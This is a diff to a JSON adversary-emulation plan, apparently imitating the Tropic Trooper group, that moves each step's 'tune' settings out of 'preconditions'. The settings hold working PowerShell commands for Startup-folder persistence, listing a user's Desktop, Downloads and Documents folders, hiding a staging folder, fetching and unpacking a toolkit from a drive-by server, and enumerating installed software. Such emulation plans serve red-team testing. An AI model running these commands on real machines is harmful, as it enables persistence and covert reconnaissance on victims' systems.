@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "tropic_trooper_v1-kit.zip",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -92,7 +100,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -104,7 +113,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -116,7 +126,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Persistence",
@@ -125,10 +136,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command=quser; $string=Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $w = new-object -comobject wscript.shell; $s = $w.createshortcut(\"C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\StartupMessageBox.lnk\"); $s.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"; $s.arguments = \"-w hidden -c \"\"&{[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Executed shortcut in startup','Startup Link')}\"\" \"; $s.save(); echo \"Persistence Loaded\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command=quser; $string=Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $w = new-object -comobject wscript.shell; $s = $w.createshortcut(\"C:\\Users\\$username\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\StartupMessageBox.lnk\"); $s.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"; $s.arguments = \"-w hidden -c \"\"&{[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Executed shortcut in startup','Startup Link')}\"\" \"; $s.save(); echo \"Persistence Loaded\"}"
             }
         },
         {
@@ -138,10 +149,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Desktop| Sort-Object -property lastwritetime; echo 'User Desktop Directory Listing Complete';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Desktop| Sort-Object -property lastwritetime; echo 'User Desktop Directory Listing Complete';}"
             }
         },
         {
@@ -151,10 +162,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Downloads| Sort-Object -property lastwritetime; echo 'User Downloads Directory Listing Complete';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Downloads| Sort-Object -property lastwritetime; echo 'User Downloads Directory Listing Complete';}"
             }
         },
         {
@@ -164,10 +175,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Documents| Sort-Object -property lastwritetime; echo 'User Documents Directory Listing Complete';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Documents| Sort-Object -property lastwritetime; echo 'User Documents Directory Listing Complete';}"
             }
         },
         {
@@ -177,10 +188,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{New-Item -ItemType directory -Force -Path 'C:\\Users\\Public\\Documents\\Flash'; $FILE=Get-Item 'C:\\Users\\Public\\Documents\\Flash' -Force; $FILE.attributes='Hidden'; echo 'Hidden Folder Attribute modified';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{New-Item -ItemType directory -Force -Path 'C:\\Users\\Public\\Documents\\Flash'; $FILE=Get-Item 'C:\\Users\\Public\\Documents\\Flash' -Force; $FILE.attributes='Hidden'; echo 'Hidden Folder Attribute modified';}"
             }
         },
         {
@@ -190,13 +201,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain2",
-                    "file_name": "self.tool_name2",
-                    "output_directory": "C:\\Users\\Public\\Documents\\Flash",
-                    "output_file_name": "a.zip"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain2",
+                "file_name": "self.tool_name2",
+                "output_directory": "C:\\Users\\Public\\Documents\\Flash",
+                "output_file_name": "a.zip"
             }
         },
         {
@@ -206,10 +217,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\Documents\\Flash\\a.zip -DestinationPath C:\\Users\\Public\\Documents\\Flash; echo 'Uncompressed toolkit'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Expand-Archive C:\\Users\\Public\\Documents\\Flash\\a.zip -DestinationPath C:\\Users\\Public\\Documents\\Flash; echo 'Uncompressed toolkit'}"
             }
         },
         {
@@ -220,7 +231,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -230,7 +242,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -239,10 +252,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{get-wmiobject -class win32_product;echo 'Enumerate Installed Software';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{get-wmiobject -class win32_product;echo 'Enumerate Installed Software';}"
             }
         },
         {
@@ -253,7 +266,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -263,7 +277,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
